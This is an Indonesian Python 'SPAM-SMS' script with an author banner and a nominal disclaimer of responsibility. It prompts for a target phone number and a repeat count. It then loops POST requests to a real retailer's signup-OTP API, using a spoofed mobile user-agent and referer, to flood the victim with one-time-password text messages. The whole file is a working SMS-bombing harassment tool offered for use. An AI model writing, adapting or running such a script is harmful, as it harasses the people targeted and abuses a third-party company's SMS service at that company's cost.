#DENGAN MERECODE TIDAK AKAN MENINGKATKAN SKIILL
import os, requests
from requests import post
import termcolor
from termcolor import colored
import time
os.system('figlet "SPAM-SMS"')
banner = """
+------------------------------+
Code : ABIN XD.5TX
Instagram : abinayanafaiq_
Team Support : D4RK.5TX
[!]IDAK DIGUNAKAN UNTUK HAL MERUGIKAN[!]
[!]DENGAN MENGGUNAKAN SCRIPT INI ANDA TELAH MENYETUJUI KAMI,AUTHOR TIDAK BERTANGGUNG JAWAB[!]
+------------------------------+
"""
print(banner)
no = input(colored('NOMOR TARGET:','blue'))
jml = int(input(colored('Jumlah Spam:','red')))
ua = {
'Connection': 'keep-alive',
'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1; CPH1605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',
'Referer': 'https://www.mapclub.com/en/user/signup',
}

dat = {
'phone': no,
}
for x in range(jml):
	time.sleep(5)
	sendSms = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=ua, data=dat)

	if 'error' in sendSms.text:
		print("Spam SMS " + no + " [GAGAL] ")
	else:
		print("SPAM SMS " + no + " [SUCCES] ")

#Ngaku Hekel ga bisa coding
